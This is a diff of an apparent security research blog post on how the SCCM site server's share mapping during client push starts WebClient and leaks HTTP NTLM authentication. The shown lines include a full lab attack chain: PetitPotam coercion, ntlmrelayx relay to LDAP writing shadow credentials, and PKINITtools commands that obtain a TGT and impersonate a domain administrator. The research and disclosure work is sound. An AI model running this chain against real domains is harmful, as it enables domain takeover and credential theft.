@@ -79,27 +79,27 @@ When notifying Garrett of this unexpected find, the question on both of our mind
 
 At this point, Garrett and I started looking into this confusing functionality. HTTP authentication just seemed to be *coerced* and WebClient just seemed to *start* with no explanation. Using a combination of [CMTrace](https://learn.microsoft.com/en-us/intune/configmgr/core/support/cmtrace) and [Ghidra](https://github.com/NationalSecurityAgency/ghidra), Garrett and I came to a conclusion as to why the site server sends the unexplained rogue HTTP NTLM authentication and starts the WebClient service.
 
-We first started using C:\Windows\CCM\CMTrace.exe, which is used to visualize and display SCCM logs. We specifically started by viewing the entries in ccm.log, due to its visibility into the client push installation process. When initiating the rogue client push process, some interesting debug messages and errors appeared. Noting specifically instances of failed share connections and the WNetAddConnection2 Windows API call.
+We first started using `C:\Windows\CCM\CMTrace.exe`, which is used to visualize and display SCCM logs. We specifically started by viewing the entries in ccm.log, due to its visibility into the client push installation process. When initiating the rogue client push process, some interesting debug messages and errors appeared. Noting specifically instances of failed share connections and the `WNetAddConnection2` Windows API call.
 
 ![](https://specterops.io/wp-content/uploads/sites/3/2026/01/image_3b3339.png?w=1024)
 
-Going further, after decompiling the dynamic-link library (DLL) used for client push installation (i.e., *ccm.dll* ) using Ghidra, we confirmed that during the client push installation process the WNetAddConnection2 Windows API call is actively used. To find this specific usage in Ghidra, we used a string search for the error message shown in the CMTrace logs to identify the correct location of the target instructions.
+Going further, after decompiling the dynamic-link library (DLL) used for client push installation (i.e., *ccm.dll* ) using Ghidra, we confirmed that during the client push installation process the `WNetAddConnection2` Windows API call is actively used. To find this specific usage in Ghidra, we used a string search for the error message shown in the CMTrace logs to identify the correct location of the target instructions.
 
 ![](https://specterops.io/wp-content/uploads/sites/3/2026/01/image_969eb3.png?w=1024)
 
-Looking at the WNetAddConnection2 Windows API call [documentation](https://learn.microsoft.com/en-us/windows/win32/api/winnetwk/nf-winnetwk-wnetaddconnection2a), this specific call is explicitly used for mapping shares, which aligns with the output/debug message logs seen in CMTrace.
+Looking at the `WNetAddConnection2` Windows API call [documentation](https://learn.microsoft.com/en-us/windows/win32/api/winnetwk/nf-winnetwk-wnetaddconnection2a), this specific call is explicitly used for mapping shares, which aligns with the output/debug message logs seen in CMTrace.
 
 Knowing the site server was actively mapping shares on SCCM clients, rogue or otherwise, was a massive find in understanding the underlying vulnerable functionality, especially due to WebClient’s known relation to starting due to share mappings. For example, earlier last year, Synacktiv released [this article](https://www.synacktiv.com/publications/taking-the-relaying-capabilities-of-multicast-poisoning-to-the-next-level-tricking#2-tricking-windows-smb-clients-into-falling-back-to-webdav) covering the ability to force SMB clients to fall back to WebDav authentication. Synacktiv explicitly mentions that “Running the net use command targeting a non-existing SMB share in Windows cmd.” as part of a share mapping procedure starts WebClient and sends HTTP authentication.
 
-At this point, we know the site server is mapping shares, but are the WNetAddConnection2 API calls being used by the site server similar enough to the net use command mentioned by Synactiv to start WebClient?
+At this point, we know the site server is mapping shares, but are the `WNetAddConnection2` API calls being used by the site server similar enough to the net use command mentioned by Synactiv to start WebClient?
 
-The last piece in the puzzle came from examining the imports of the net.exe binary.
+The last piece in the puzzle came from examining the imports of the `net.exe` binary.
 
 ![](https://specterops.io/wp-content/uploads/sites/3/2026/01/image_bac998.png?w=1024)
 
-As seen above, the net.exe binary imports the exact same WNet family of calls which the site server uses to map shares on clients. Meaning, that the site server is essentially executing the same underlying API calls as using the net use \\host\share method of WebClient service start.
+As seen above, the `net.exe` binary imports the exact same WNet family of calls which the site server uses to map shares on clients. Meaning, that the site server is essentially executing the same underlying API calls as using the `net use \\host\share` method of WebClient service start.
 
-Exploring deeper into previous resources, [Steven Flores](https://x.com/0xthirteen) also covered these API calls used by net.exe for starting WebClient in his deep-dive blog on starting WebClient for offensive purposes: [Will WebClient Start?](https://specterops.io/blog/2025/08/19/will-webclient-start/)
+Exploring deeper into previous resources, [Steven Flores](https://x.com/0xthirteen) also covered these API calls used by `net.exe` for starting WebClient in his deep-dive blog on starting WebClient for offensive purposes: [Will WebClient Start?](https://specterops.io/blog/2025/08/19/will-webclient-start/)
 
 ## Requirements and Impact
 
@@ -194,7 +194,7 @@ python3 PetitPotam.py -u domainuser -p 'password' -d ludus.domain attacker@80/te
 
 ![](https://specterops.io/wp-content/uploads/sites/3/2026/01/image_4d95d8.png)When
 
-looking back at the relay server, started with the –shadow-credentials flag, the site server machine account authentication has been relayed to LDAP for successful authentication and the MsDs-KeyCredentialLink attribute has been written, allowing takeover.
+looking back at the relay server, started with the `–shadow-credentials` flag, the site server machine account authentication has been relayed to LDAP for successful authentication and the `MsDs-KeyCredentialLink` attribute has been written, allowing takeover.
 
 ```
 ntlmrelayx.py -t ldap://10.2.10.10 -smb2support --no-smb-server --shadow-credentials --no-dump --no-da --no-acl --no-validate-privs
@@ -202,7 +202,7 @@ ntlmrelayx.py -t ldap://10.2.10.10 -smb2support --no-smb-server --shadow-credent
 
 ![](https://specterops.io/wp-content/uploads/sites/3/2026/01/image_896992.png)
 
-Using the command provided by ntlmrelayx.py we can grab a usable ticket-granting ticket (TGT) using the written shadow credentials on the site server.
+Using the command provided by `ntlmrelayx.py` we can grab a usable ticket-granting ticket (TGT) using the written shadow credentials on the site server.
 
 ```
 python3 PKINITtools/gettgtpkinit.py -cert-pfx kKdxovJV.pfx -pfx-pass KFdUBOpTYkwcBmYTbDPd -dc-ip 10.2.10.10 'ludus.domain/SCCM-SITESRV$' kKdxovJV.ccache
@@ -210,7 +210,7 @@ python3 PKINITtools/gettgtpkinit.py -cert-pfx kKdxovJV.pfx -pfx-pass KFdUBOpTYkw
 
 ![](https://specterops.io/wp-content/uploads/sites/3/2026/01/image_7e5b10.png)
 
-For direct access to the site server host, use the TGT as the SITESRV$ machine account and gets4uticket.py to impersonate a member of the *DOMAIN ADMINS* group. Then, standard lateral movement options are available, such as retrieving credentials from the Security Account Manager (SAM) hive.
+For direct access to the site server host, use the TGT as the `SITESRV$` machine account and `gets4uticket.py` to impersonate a member of the *DOMAIN ADMINS* group. Then, standard lateral movement options are available, such as retrieving credentials from the Security Account Manager (SAM) hive.
 
 ```
 python3 PKINITtools/gets4uticket.py 'kerberos+ccache://ludus.domain\SCCM-SITESRV$:kKdxovJV.ccache@10.2.10.10' 'cifs/sccm-sitesrv.ludus.domain@ludus.domain' 'Administrator@ludus.domain' admin.ccache
